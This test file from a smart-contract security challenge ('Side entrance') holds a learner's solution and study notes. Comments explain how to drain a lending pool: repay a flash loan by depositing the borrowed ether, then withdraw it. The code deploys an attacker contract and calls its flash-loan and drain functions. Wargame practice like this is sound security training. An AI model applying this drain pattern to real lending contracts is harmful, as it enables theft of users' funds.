const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /**
         * Mappings are private so we can't change it directly
         * I was thinking i should call flashloan then desposit it back to the flashloan then call withdraw after the end of this transaction
         * Transaction 1: call flashloan then deposit it back to flashloan
         * This is so the transaction don't get reverted
         * Then call withdraw to get it all back in the second transaction
         * The solution gotta be related to interfaces
         */

        /**
         * Throught this exercise, ik my weaknesses,
         * I am still not quite clear with payable addresses
         * I am not clear with abstracts and interfaces
         * I am not clear with when to use inheritance
         */

        // const attackerPool  = await this.pool.connect(attacker);
        // await attackerPool.withdraw();
        // tx = {
        //     to:attacker.address,
        //     value:ethers.utils.parseEther("1000")
        // }
        // await attackerPool.sendTransaction(tx);


        const FlashLoanEtherRecieverActual = await ethers.getContractFactory("FlashLoanEtherRecieverActual",attacker);
        const attackerContract = await FlashLoanEtherRecieverActual.deploy(this.pool.address);
        await attackerContract.executeFlashLoan();
        await attackerContract.drain();
        // How to send money from contract to a EOA address directly in solidity?
        // I just use the call function/ i wanted to use ethers to send the transaction below but it did not work
        // tx = {
        //     to:attacker.address,
        //     value:ethers.utils.parseEther("1000")
        // }
        // await attackerContract.sendTransaction(tx);


        //Reflections
        /**
         * First mistake is i did not understand interfaces/ abstracts and contract inheritance that well, i knew the general idea but did not really know how it worked
         * Second mistake is that i did not implement the recieve () external payable function{} and fallback () external payable function {} 
         * and let to the contract not being able to recieve the funds sent from withdrawinf
         * Third mistake is not so much solidity but i forgot how detached heads work in git.
         * So i commited all the changes on the detached head
         * and i forgot how to merge
         * 
         * Sources to help
         * Git detached head -https://stackoverflow.com/questions/10228760/how-do-i-fix-a-git-detached-head
         * Sending ether to a  payable function -https://ethereum.stackexchange.com/questions/123676/how-to-call-a-payable-function-and-pay-from-the-contract-balance
         * Interfaces/Abstracts-https://ethereum.stackexchange.com/questions/133825/what-is-the-practical-purpose-of-interface-contracts
         *                     -https://solidity-by-example.org/interface/  
         *                      
         */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
